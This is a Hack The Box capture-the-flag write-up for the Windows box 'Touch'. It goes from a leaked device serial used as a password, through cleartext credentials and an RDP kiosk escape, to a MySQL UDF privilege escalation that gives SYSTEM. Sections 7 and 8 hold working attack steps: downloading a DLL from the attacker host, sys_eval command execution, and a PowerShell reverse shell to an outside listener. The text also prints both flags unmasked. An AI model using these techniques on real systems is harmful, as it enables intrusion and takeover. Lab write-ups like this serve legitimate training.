# Touch

## HTB Touch — Complete Writeup

**Box:** Touch **OS:** Windows 11 (Build 26100) **Difficulty:** Easy **Season:** 12 **Status:** user ✓ · root ✓ (SYSTEM)

| Flag       | Value                              |
| ---------- | ---------------------------------- |
| `user.txt` | `213800eb62c7f611fb05c986959c9ae0` |
| `root.txt` | `00da392102202459d9f9e9a20dc25574` |

***

### TL;DR — Attack Chain

```
Port 8443 (Nexion DeviceHub)
  │  unauthenticated serial leak  →  serial reused as the login password
  ▼
Admin dashboard
  │  Windows creds sitting in the HTML DOM (hidden by a cosmetic JS toggle)
  ▼
RDP as kioskuser  (locked fullscreen "HTB Airways" kiosk)
  │  knock scanner offline → .NET WinForms error dialog → hyperlink → Edge
  │  Edge → Ctrl+S / Save As → browse to System32 → cmd.exe
  ▼
cmd.exe as kioskuser   →   user.txt
  │  recursive search of C:\ProgramData → HTB Airways\refresh-dates.bat
  │  → MySQL ROOT password (kiosk_app from the backend config is a decoy)
  │  C:\MySQL\lib\plugin\ writable by Authenticated Users + mysqld = LocalSystem
  ▼
MySQL UDF (lib_mysqludf_sys → sys_eval) registered as root
  ▼
nt authority\system   →   root.txt
```

**One-line summary:** unauthenticated serial leak → default-password reuse → cleartext creds in HTML DOM → RDP kiosk breakout → MySQL root pw in a ProgramData `.bat` → writable plugin dir + SYSTEM `mysqld` → UDF privesc → SYSTEM.

***

### 1. Recon

```bash
nmap --privileged -p- -sCV 10.129.X.X
```

| Port | Service                                           |
| ---- | ------------------------------------------------- |
| 135  | MSRPC                                             |
| 3389 | RDP                                               |
| 5985 | WinRM                                             |
| 8443 | HTTP — Nexion DeviceHub (`Microsoft-HTTPAPI/2.0`) |

> **Note:** Port 8443 is plain **HTTP**, not HTTPS, despite the conventional "secure" port number. Hit it with `http://`.

***

### 2. Initial Access — Serial-as-Password (Port 8443)

The web service on 8443 is a custom .NET appliance, the **Nexion DocReader / DeviceHub**. The `/login` page carries the hint that the _"default password is the device serial number."_

The device serial is disclosed **pre-authentication** from a status endpoint:

```bash
curl -s http://10.129.X.X:8443/api/status     # leaks the serial, e.g. NX-DH-2024-B7042
```

Reuse that serial as the login password:

```bash
curl -s -i http://10.129.X.X:8443/login \
  -d 'password=<SERIAL>' -c cookies.txt
# → HTTP/1.1 302 Found, Location: /dashboard
# → Set-Cookie: nxsession=...
```

**Vulnerability:** unauthenticated information disclosure (serial) combined with a default-credential policy that makes that serial the valid password.

***

### 3. Dashboard → Windows Credentials (cleartext in the DOM)

The authenticated dashboard renders the device's Windows account and password **directly in the HTML**, merely hidden behind a cosmetic JavaScript show/hide toggle:

```bash
curl -s http://10.129.X.X:8443/dashboard -b cookies.txt | grep -i toggleCred
# onclick="toggleCred('dsu1','KioskUser')"
# onclick="toggleCred('dsp1','K!0sk2026#')"
```

**Credentials recovered:**

```
kioskuser : K!0sk2026#
```

A quick auth check shows **WinRM (5985) rejects these creds** (verify with `nxc winrm ...`). RDP is the way in.

***

### 4. RDP Foothold (kiosk)

```bash
xfreerdp /v:10.129.X.X /u:kioskuser /p:'K!0sk2026#' \
  /cert:ignore +clipboard /dynamic-resolution
```

The session lands in a locked, fullscreen **"HTB Airways"** kiosk application:

* No taskbar, no Start menu, no Explorer.
* The physical keyboard doesn't reliably reach the host shell.
* The kiosk is a .NET WinForms app that continuously polls a document scanner.

***

### 5. Kiosk Escape → `cmd.exe`

The escape chains an application crash into a native dialog that can reach the browser, and from the browser to a shell.

**5a. Knock the scanner offline.** The kiosk polls a scan target via the DeviceHub API; we're already authenticated to it, so power the scanner off:

```bash
curl -s -i -X POST http://10.129.X.X:8443/api/scanner/power \
  -b cookies.txt \
  -H 'Content-Type: application/json' \
  -d '{"powered":false}'

# (optional) force a scan attempt against the now-dead device:
#   POST /api/scan  with  Content-Length: 0
```

**5b. Trigger the error dialog.** With its scan target gone, the app throws an unhandled exception → a native **WinForms error dialog**:

```
Nexion DocReader SR-4200 — Error
Code: SCN-ERR-4092
```

**5c. Dialog → browser → shell.** The dialog body contains a **clickable hyperlink** → it opens **Microsoft Edge**. From Edge:

1. `Ctrl+S` (Save As) on any page — opens the Save dialog with a full file browser.
2. Use the dialog's "show in folder" / address bar to navigate Explorer to `C:\Windows\System32`.
3. Launch **`cmd.exe`**.

Shell obtained as **kioskuser**:

```cmd
whoami
:: kiosk-042\kioskuser

type C:\Users\kioskuser\Desktop\user.txt
:: 213800eb62c7f611fb05c986959c9ae0
```

🚩 **user.txt = `213800********************`**

***

### 6. Enumeration for Privesc

Facts gathered from the `kioskuser` shell:

* Backend app: Node/TS at `C:\Program Files\HTB Airways\Kiosk`, launched via a `C:\ProgramData` batch script.
* **MySQL** installed at `C:\MySQL\`, `mysqld` **8.0.42** running as **LocalSystem**.
*   Plugin directory `C:\MySQL\lib\plugin\` is **writable by Authenticated Users**:

    ```cmd
    icacls C:\MySQL\lib\plugin
    :: ... BUILTIN\Users:(M) / Authenticated Users:(M)   <-- Modify
    ```
* `secure_file_priv=NULL` → `INTO DUMPFILE` / `LOAD_FILE` are **blocked** (so we can't write the UDF DLL _through_ MySQL — but we don't need to; we have filesystem Modify as kioskuser).

#### The decoy

The backend config `packages\backend\src\database\index.ts` hardcodes a DB login:

```
host 127.0.0.1  port 3306  user kiosk_app  password K!0sk_R3pl1ca#DB  db htb_airways
```

**`kiosk_app` is a red herring.** Its grants are only `USAGE ON *.*` + `ALL ON htb_airways.*` — **no `FILE`, no access to the `mysql` db → cannot `CREATE FUNCTION`.** The UDF route needs the **root** account.

#### Finding the real password (the key step)

The common non-recursive check misses it:

```cmd
type C:\ProgramData\*.bat         :: <-- finds nothing useful; does NOT recurse
```

The MySQL **root** password lives one directory deeper. Search **recursively**:

```cmd
findstr /s /i "password" C:\ProgramData\*.bat
:: C:\ProgramData\HTB Airways\refresh-dates.bat: ... HTB@irw4ys_DB!2026 ...
```

> **Lesson:** `findstr /s` recurses into subdirectories; a bare `*.bat` glob in a single directory does not. Don't abandon the ProgramData branch just because the top-level glob is empty.

**MySQL root password recovered:**

```
root : HTB@irw4ys_DB!2026
```

This account **can `CREATE FUNCTION`** — the UDF path is fully open.

***

### 7. Privilege Escalation — MySQL UDF (`lib_mysqludf_sys`) → SYSTEM

`mysqld` runs as **LocalSystem**, so any native function we load into it executes as **SYSTEM**.

**7a. Cross-compile the UDF DLL on Kali** (`lib_mysqludf_sys`, exporting `sys_eval` via `CreateProcess`):

```bash
x86_64-w64-mingw32-gcc -shared -o sys_eval.dll sys_eval.c -I C:/MySQL/include
```

**7b. Stage it on the target.** Because `secure_file_priv=NULL` blocks `INTO DUMPFILE`, drop the DLL into the writable plugin dir using the filesystem Modify we already hold as kioskuser:

```bash
# Kali
python3 -m http.server 80
```

```cmd
:: target (kioskuser cmd)
curl.exe http://10.10.16.216/sys_eval.dll -o C:\MySQL\lib\plugin\sys_eval.dll
```

**7c. Register the UDF as root and execute as SYSTEM:**

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026
```

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'sys_eval.dll';
SELECT sys_eval('whoami');
-- nt authority\system
```

🔑 **Confirmed SYSTEM execution.**

**7d. Read the root flag.** `sys_eval` returns a binary blob; the mysql client prints it as hex, so `CONVERT(... USING utf8)` gives clean ASCII:

```sql
SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);
-- 00da392102202459d9f9e9a20dc25574
```

> Note the doubled backslashes: inside a MySQL string literal `\` is an escape character, so the Windows path must be written `C:\\Users\\Administrator\\Desktop\\root.txt`.

🚩 **root.txt = `00da3921022****************`**

***

### 8. (Optional) Interactive SYSTEM shell

`sys_eval` already gives one-shot SYSTEM command execution — equivalent to owning the box. For an interactive shell, fire a PowerShell reverse shell through the same primitive:

```bash
# Kali
nc -lvnp 4444
```

```sql
-- as root; <ENC> = base64(UTF-16LE) of a TCPClient reverse-shell one-liner to 10.10.16.216:4444
SELECT sys_eval('powershell -nop -w hidden -enc <ENC>');
```

***

### Key Takeaways

1. **Pre-auth disclosure + default creds** — a leaked serial that doubles as the password is a single-request initial access.
2. **Secrets in the DOM** — a client-side "hide" toggle is not access control; the credentials are in the HTML the moment you authenticate.
3. **Kiosk breakout** — an unhandled exception that surfaces a native dialog with a hyperlink is a classic pivot: dialog → browser → Save-As file browser → `cmd.exe`.
4. **Enumerate recursively** — `findstr /s` found the real MySQL root password in `C:\ProgramData\HTB Airways\refresh-dates.bat`; a non-recursive `*.bat` glob missed it entirely. `kiosk_app` was a deliberate decoy.
5. **Writable plugin dir + SYSTEM `mysqld` = SYSTEM** — the lib\_mysqludf\_sys UDF route only needs a MySQL account with `CREATE FUNCTION` and a writable `plugin_dir`; `INTO DUMPFILE` being blocked is irrelevant when you already have filesystem write.

***

### Credential / Artifact Reference

| Item                | Value                                                      |
| ------------------- | ---------------------------------------------------------- |
| DeviceHub login     | serial (leaked from `/api/status`) as password             |
| Windows account     | `kioskuser` : `K!0sk2026#`                                 |
| MySQL (decoy)       | `kiosk_app` : `K!0sk_R3pl1ca#DB` (no FILE priv — dead end) |
| MySQL (root)        | `root` : `HTB@irw4ys_DB!2026`                              |
| Root pw location    | `C:\ProgramData\HTB Airways\refresh-dates.bat`             |
| Writable plugin dir | `C:\MySQL\lib\plugin\` (Authenticated Users: Modify)       |
| `user.txt`          | `213800eb62c7f611fb05c986959c9ae0`                         |
| `root.txt`          | `00da392102202459d9f9e9a20dc25574`                         |
